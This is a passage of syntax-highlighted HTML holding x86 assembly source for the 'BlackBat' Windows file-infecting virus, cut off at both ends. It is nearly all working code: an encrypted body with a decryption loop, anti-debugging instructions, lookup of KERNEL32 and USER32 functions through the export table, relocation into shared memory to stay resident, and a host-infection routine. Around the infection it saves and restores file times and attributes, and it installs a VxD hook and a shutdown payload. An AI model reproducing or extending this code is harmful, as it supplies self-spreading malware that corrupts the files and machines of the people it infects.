    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncryptedVirusCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetDelta</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0B9h</span><span class="sc0">                            </span><span class="sc1">;mov    ecx, ENCRYPTED_SIZE</span><span class="sc0">
    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">ENCRYPTED_SIZE</span><span class="sc0">
</span><span class="sc5">DecryptByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">;xor    byte ptr [esi], 00h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">36h</span><span class="sc0">
</span><span class="sc5">EncryptionKey</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">46h</span><span class="sc0">                             </span><span class="sc1">;inc    esi</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">49h</span><span class="sc0">                             </span><span class="sc1">;dec    ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">DecryptByte</span><span class="sc0">

</span><span class="sc5">EncryptedVirusCode</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;Code from this point is encrypted</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WinMain</span><span class="sc0">                 </span><span class="sc1">;Goto Main Program</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            Data Area                                   | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
    </span><span class="sc5">dwKernelBase</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">      </span><span class="sc1">;Base address of KERNEL32.DLL</span><span class="sc0">
    </span><span class="sc5">dwUserBase</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Base address of USER32.DLL</span><span class="sc0">
    </span><span class="sc5">szUser32DLL</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"USER32"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;.DLL Extention is not required</span><span class="sc0">

</span><span class="sc1">;Host File Variables</span><span class="sc0">
    </span><span class="sc5">hHostFile</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Handle of host file</span><span class="sc0">
    </span><span class="sc5">hMappedFile</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Handle of mapped host file</span><span class="sc0">
    </span><span class="sc5">lpHostFile</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Pointer to mapped host file in memory</span><span class="sc0">
    </span><span class="sc5">ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">;Time the file was last accessed</span><span class="sc0">
    </span><span class="sc5">ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">;Time the file was last written to</span><span class="sc0">
    </span><span class="sc5">dwFileAttributes</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;File attributes of host file</span><span class="sc0">
</span><span class="sc1">;Virus Variables</span><span class="sc0">
    </span><span class="sc5">szNoInfectFileName</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"C:\WIN.SYS"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;If this file exists, machine is not infected</span><span class="sc0">

</span><span class="sc1">;VxD Stuff</span><span class="sc0">
    </span><span class="sc5">OldInt30</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">VxDCall_Busy</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Semaphore</span><span class="sc0">
    </span><span class="sc5">szOutputFile</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"C:\VIRUS.TXT"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;KERNEL32 API's</span><span class="sc0">
    </span><span class="sc5">VxDCall</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">;Exported by ordinal only (Ord 1)</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">GetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">GetFileTime</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">GetLocalTime</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">SetFileTime</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc1">;USER32 API's</span><span class="sc0">
    </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">ExitWindowsEx</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc5">@DEFINE_API</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">;DEBUG Only Stuff</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc5">szHostFileName</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"NOTEPAD.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">szWinMainHandler</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Unhandled Exception in WinMain"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">szPayLoad</span><span class="sc0">               </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"Happy BirthDay :-)"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">szInfected</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"This File is Infected by the BlackBat Virus"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                             WinMain                                    | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc5">WinMain</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">IFE</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                               </span><span class="sc1">;Only for Release Versions</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">                         </span><span class="sc1">;Anti-Debug Code ...</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">                         </span><span class="sc1">;...will crash if single-stepped</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

    </span><span class="sc5">@TRY_BEGIN</span><span class="sc0"> </span><span class="sc5">WinMain_Handler</span><span class="sc0">              </span><span class="sc1">;Putting code in protected block</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IsVirusActive</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Virus Resident ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">End_WinMain</span><span class="sc0">                 </span><span class="sc1">;Yes, return to host</span><span class="sc0">

        </span><span class="sc1">;Get Addresses of all Required API's</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIAddresses</span><span class="sc0">             </span><span class="sc1">;Get the addresses of the other API's</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Error occured ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_WinMain</span><span class="sc0">                 </span><span class="sc1">;Transfer control to host</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
            </span><span class="sc5">@MESSAGE_BOX</span><span class="sc0"> </span><span class="sc5">szInfected</span><span class="sc0">
            </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szHostFileName</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">;Check if this Machine is to be Infected</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CanMachineBeInfected</span><span class="sc0">        </span><span class="sc1">;Is this my machine</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_WinMain</span><span class="sc0">                 </span><span class="sc1">;Yes, so don't infect</span><span class="sc0">

        </span><span class="sc1">;Relocate Virus (Make Resident)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RelocateVirus</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;Virus Relocated?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">End_WinMain</span><span class="sc0">                     </span><span class="sc1">;No</span><span class="sc0">

        </span><span class="sc1">;Jump to Relocated Virus Copy</span><span class="sc0">
        </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">               </span><span class="sc1">;Start of Virus in Non-Relocated Copy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RelocatedVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Control will go to Relocated Copy</span><span class="sc0">

        </span><span class="sc1">;This part is the Relocated Copy of the Virus in Shared Memory</span><span class="sc0">
</span><span class="sc5">RelocatedVirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;When a file is infected, the CALL instruction at label ReturnToHost is</span><span class="sc0">
        </span><span class="sc1">;replaced by a JMP XXXXXXXX instruction. Since the virus has been relocated,</span><span class="sc0">
        </span><span class="sc1">;this JMP instruction will point to some invalid location. We need to modify</span><span class="sc0">
        </span><span class="sc1">;this, so that the JMP points to the host program (which was not relocated)</span><span class="sc0">

        </span><span class="sc1">;The offset of Calculate_Offset_Instruction in the non-relocated virus was</span><span class="sc0">
        </span><span class="sc1">;saved in EBX before jumping here. Now we calculate the offset in the relocated</span><span class="sc0">
        </span><span class="sc1">;virus (this copy).</span><span class="sc0">

        </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;Save Delta Offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">    </span><span class="sc1">;Start of Virus in Relocated Copy</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">;Difference in offsets</span><span class="sc0">

        </span><span class="sc1">;We now subtract this difference from the offset specified in the JMP</span><span class="sc0">
        </span><span class="sc1">;instruction, and update the JMP instruction to point to the correct location</span><span class="sc0">
        </span><span class="sc1">;in memory</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;Point to operand of JMP instruction</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;Fix JMP instruction</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InstallHookProcedure</span><span class="sc0">

</span><span class="sc5">End_WinMain</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@TRY_EXCEPT</span><span class="sc0"> </span><span class="sc5">WinMain_Handler</span><span class="sc0">
        </span><span class="sc5">@MESSAGE_BOX</span><span class="sc0"> </span><span class="sc5">szWinMainHandler</span><span class="sc0">
    </span><span class="sc5">@TRY_END</span><span class="sc0"> </span><span class="sc5">WinMain_Handler</span><span class="sc0">

</span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">             </span><span class="sc1">;JMP instruction used for passing control</span><span class="sc0">
                                        </span><span class="sc1">;to the host. The address of this JMP</span><span class="sc0">
                                        </span><span class="sc1">;instruction is calculated at run-time</span><span class="sc0">
    </span><span class="sc1">;ret                                ;Not required, since control is transfered to host</span><span class="sc0">
</span><span class="sc5">WinMain</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                          GetAPIAddresses                               | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Finds the Address of the API's to be used by the virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: 1, if the API addresses were found, 0 otherwise</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;___________________</span><span class="sc0">
</span><span class="sc5">GetAPIAddresses</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAddressOfKernelAPI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;Get Address Of GetProcAddress</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Found Address ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_GetAPIAddresses</span><span class="sc0">         </span><span class="sc1">;No, Return 0</span><span class="sc0">

</span><span class="sc1">;Get addresses of all required KERNEL32 API's</span><span class="sc0">
</span><span class="sc1">;ESI = Delta Offset</span><span class="sc0">
</span><span class="sc1">;EBX = Address of GetProcAddress(...)</span><span class="sc0">
</span><span class="sc1">;ECX = Image Base of KERNEL32.DLL</span><span class="sc0">
    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Address of GetProcAddress(...)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwKernelBase</span><span class="sc0">           </span><span class="sc1">;Base address of KERNEL32.DLL</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">GetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">GetFileTime</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">GetLocalTime</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">SetFileTime</span><span class="sc0">
    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc1">;Load USER32.DLL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;Save address of GetProcAddress(...)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;Delta Offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szUser32DLL</span><span class="sc0">         </span><span class="sc1">;Name of DLL to be loaded</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;Base address of USER32.DLL</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;Restore address of GetProcAddress(...)</span><span class="sc0">

</span><span class="sc1">;Get addresses of all required USER32 API's</span><span class="sc0">
</span><span class="sc1">;ESI = Delta Offset</span><span class="sc0">
</span><span class="sc1">;EBX = Address of GetProcAddress(...)</span><span class="sc0">
</span><span class="sc1">;ECX = Image Base of USER32.DLL</span><span class="sc0">

    </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">ExitWindowsEx</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc5">@GET_API_ADDRESS</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">End_GetAPIAddresses</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAPIAddresses</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                         GetAddressOfKernelAPI                          | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Finds the address of GetProcAddress or VxDCall API in KERNEL32.DLL. The</span><span class="sc0">
</span><span class="sc1">;      VxDCall API is exported by ordinal only, and the GetProcAddress is</span><span class="sc0">
</span><span class="sc1">;      exported by name.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; EDX: offset of the program &lt;---- NOT USED ANYMORE ???</span><span class="sc0">
</span><span class="sc1">;   -&gt; gaoka_wAPIName: If 0, the address of VxDCall is Returned. Else, the address</span><span class="sc0">
</span><span class="sc1">;                      of GetProcAddress is returned.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: Address of the Required API if Found, Else NULL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;______________________________</span><span class="sc0">
</span><span class="sc5">GetAddressOfKernelAPI</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">gaoka_wAPIName</span><span class="sc4">:</span><span class="sc10">WORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">lpdwAddressOfFunctions</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">lpdwAddressOfNames</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">lpwAddressOfNameOrdinals</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwVAIED</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc1">;Get File Headers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileHeaders</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwKernelBase</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;Successfully Retreived Headers?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">End_GetAddressOfKernelAPI</span><span class="sc0">           </span><span class="sc1">;No, probably Windows NT / 2000</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwVAIED</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwKernelBase</span><span class="sc0">

</span><span class="sc1">;Get Address of Functions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwVAIED</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">])</span><span class="sc5">.IED_AddressOfFunctions</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;VA of Address of functions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpdwAddressOfFunctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;Check which API is Required</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">gaoka_wAPIName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;Return Address of VxDCall or GetProcAddress ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GetProcAddressRequired</span><span class="sc0">      </span><span class="sc1">;GetProcAddress</span><span class="sc0">

